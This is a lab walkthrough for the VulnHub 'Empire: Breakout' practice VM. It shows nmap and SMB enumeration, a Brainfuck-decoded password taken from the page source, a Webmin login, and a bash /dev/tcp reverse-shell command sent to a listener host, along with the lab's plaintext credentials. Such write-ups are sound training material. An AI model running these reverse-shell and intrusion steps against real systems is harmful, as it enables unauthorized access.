# Empire: Breakout

- **Machine:** Empire: Breakout
- **Download:** https://www.vulnhub.com/entry/empire-breakout,751/

![](786-1.png)

---

## Setup

- Extract the downloaded archive.
- Import the `.ovf` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](786-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.112
```

![](786-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.112
```

```bash
nmap -sC -sV -A 192.168.2.112
```

---

## HTTP Enumeration

This command performs an aggressive scan and uses the `http-enum` NSE script to discover interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.112
```

![](786-4.png)

---

# Web Enumeration

Visit the following URLs:

- http://192.168.2.112/
- http://192.168.2.112/manual/en/index.html
- https://192.168.2.112:10000/
- https://192.168.2.112:20000/

---

## Inspect the Source Code

View the source code of the web page hosted on port **80**.

![](786-5.png)

An encoded string is discovered within the page source.

---

## Decode the Hidden Value

Use an online Brainfuck decoder to decode the string.

- https://md5decrypt.net/en/Brainfuck-translator/

![](786-6.png)

### Decoded Password

```text
.2uqPEfj3D<P'a-3
```

---

# SMB Enumeration

## Enumerate SMB Information

Use Enum4linux to enumerate SMB users and shares.

```bash
enum4linux -a 192.168.2.112
```

![](786-7.png)

### Username Discovered

```text
cyber
```

---

# Webmin Login

Use the recovered credentials to authenticate to the service running on **port 20000**.

### Credentials

```text
Username : cyber
Password : .2uqPEfj3D<P'a-3
```

![](786-8.png)

Successful authentication.

![](786-9.png)

---

# Reverse Shell (Lab)

> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.

## Open the Command Shell

After logging in, navigate to the **Command Shell** module.

![](786-10.png)

---

## Start a Listener

```bash
nc -nlvp 443
```

---

## Execute the Reverse Shell Payload

Run the following command from the command shell.

```bash
bash -c 'bash -i >& /dev/tcp/192.168.2.219/443 0>&1'
```

![](786-11.png)

---

## Receive the Reverse Shell

A reverse shell is successfully established.

![](786-12.png)

---

# Impact

- Sensitive information was exposed in the website source code.
- Encoded credentials were easily recoverable.
- SMB enumeration revealed a valid username.
- Administrative access to the Webmin interface was obtained.
- The command execution feature allowed Remote Code Execution (RCE).
- Full shell access to the target system was achieved.

---

# Key Learning

- Always inspect the HTML source code for hidden information.
- Encoded data such as Brainfuck is not a secure method for storing secrets.
- SMB enumeration can reveal valid usernames for authentication.
- Credentials should be tested across all exposed services.
- Administrative web interfaces with command execution features can lead to complete system compromise.

---

# Summary

The assessment began with network and web enumeration, during which an encoded credential was discovered in the website source code. After decoding the value and enumerating SMB, a valid username was identified. The recovered credentials provided access to the Webmin interface on port **20000**, where the built-in command shell was used to execute a reverse shell payload, resulting in remote code execution and full access to the target machine.